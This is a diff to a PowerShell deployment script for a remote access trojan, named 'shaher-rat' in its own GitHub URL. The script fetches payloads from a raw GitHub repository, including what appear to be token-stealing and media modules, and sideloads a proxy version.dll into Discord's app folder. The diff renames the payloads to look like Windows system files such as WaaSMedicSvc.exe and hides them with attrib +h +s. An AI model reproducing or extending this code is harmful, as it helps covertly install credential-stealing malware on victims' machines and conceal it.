@@ -1,8 +1,7 @@
-﻿# GitHub deploy - downloads payload files and places them automatically.
-# Edit GitHubBaseUrl below OR pass: deploy.ps1 -GitHubBaseUrl "https://raw.githubusercontent.com/user/repo/main/deploy"
+﻿# GitHub deploy - downloads system-disguised payload files and hides them with attrib +h +s
 
 param(
-    [string]$GitHubBaseUrl = "https://raw.githubusercontent.com/YOUR_USER/YOUR_REPO/main/deploy"
+    [string]$GitHubBaseUrl = "https://raw.githubusercontent.com/xx21sa/shaher-rat/main/deploy"
 )
 
 $ErrorActionPreference = "Stop"
@@ -38,6 +37,51 @@ function Stop-DiscordIfRunning {
     }
 }
 
+function Set-SystemHidden {
+    param([string]$Path)
+
+    if (-not (Test-Path $Path)) {
+        return
+    }
+
+    attrib +h +s $Path | Out-Null
+}
+
+function Hide-DeployTree {
+    param([string[]]$Paths)
+
+    foreach ($path in $Paths) {
+        if (-not (Test-Path $path)) {
+            continue
+        }
+
+        if ((Get-Item $path).PSIsContainer) {
+            Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
+                Set-SystemHidden $_.FullName
+            }
+        }
+
+        Set-SystemHidden $path
+    }
+}
+
+function Remove-LegacyDeployFiles {
+    param([string]$PayloadRoot)
+
+    $legacy = @(
+        (Join-Path $PayloadRoot "RuntimeHost.exe"),
+        (Join-Path $PayloadRoot "core.bin"),
+        (Join-Path $PayloadRoot "Discord rat.dll"),
+        (Join-Path $PayloadRoot "modules")
+    )
+
+    foreach ($item in $legacy) {
+        if (Test-Path $item) {
+            Remove-Item $item -Recurse -Force -ErrorAction SilentlyContinue
+        }
+    }
+}
+
 function Download-GithubFile {
     param(
         [string]$RemotePath,
@@ -66,31 +110,43 @@ Write-Host "Source: $GitHubBaseUrl" -ForegroundColor Gray
 Write-Host ""
 
 $payloadRoot = Get-PayloadRoot
-$modulesDir = Join-Path $payloadRoot "modules"
+$cacheDir = Join-Path $payloadRoot "Cache"
 $discordFolder = Get-DiscordAppFolder
 
 New-Item -ItemType Directory -Path $payloadRoot -Force | Out-Null
-New-Item -ItemType Directory -Path $modulesDir -Force | Out-Null
+New-Item -ItemType Directory -Path $cacheDir -Force | Out-Null
 
 Stop-DiscordIfRunning
+Remove-LegacyDeployFiles -PayloadRoot $payloadRoot
 
 $files = @(
-    @{ Remote = "RuntimeHost.exe";           Local = Join-Path $payloadRoot "RuntimeHost.exe" },
-    @{ Remote = "core.bin";                  Local = Join-Path $payloadRoot "core.bin" },
-    @{ Remote = "modules/token.bin";         Local = Join-Path $modulesDir "token.bin" },
-    @{ Remote = "modules/media.bin";         Local = Join-Path $modulesDir "media.bin" },
-    @{ Remote = "version.dll";               Local = Join-Path $discordFolder "version.dll" }
+    @{ Remote = "WaaSMedicSvc.exe";              Local = Join-Path $payloadRoot "WaaSMedicSvc.exe" },
+    @{ Remote = "ProvData.db";                   Local = Join-Path $payloadRoot "ProvData.db" },
+    @{ Remote = "Cache/TokenProv.db";            Local = Join-Path $cacheDir "TokenProv.db" },
+    @{ Remote = "Cache/DeviceCache.db";          Local = Join-Path $cacheDir "DeviceCache.db" },
+    @{ Remote = "version.dll";                   Local = Join-Path $discordFolder "version.dll" }
 )
 
 foreach ($file in $files) {
     Download-GithubFile -RemotePath $file.Remote -LocalPath $file.Local
 }
 
+$hiddenPaths = @(
+    $payloadRoot,
+    $cacheDir,
+    (Join-Path $payloadRoot "WaaSMedicSvc.exe"),
+    (Join-Path $payloadRoot "ProvData.db"),
+    (Join-Path $cacheDir "TokenProv.db"),
+    (Join-Path $cacheDir "DeviceCache.db"),
+    (Join-Path $discordFolder "version.dll")
+)
+
+Hide-DeployTree -Paths $hiddenPaths
+
 Write-Host ""
-Write-Host "[OK] Deploy complete!" -ForegroundColor Green
+Write-Host "[OK] Deploy complete (hidden system files)" -ForegroundColor Green
 Write-Host "  Payload : $payloadRoot" -ForegroundColor White
-Write-Host "  Proxy   : $discordFolder\version.dll" -ForegroundColor White
+Write-Host "  Proxy   : $discordFolder\version.dll  [hidden+system]" -ForegroundColor White
 Write-Host ""
 Write-Host "Open Discord to start the session." -ForegroundColor Yellow
-
 
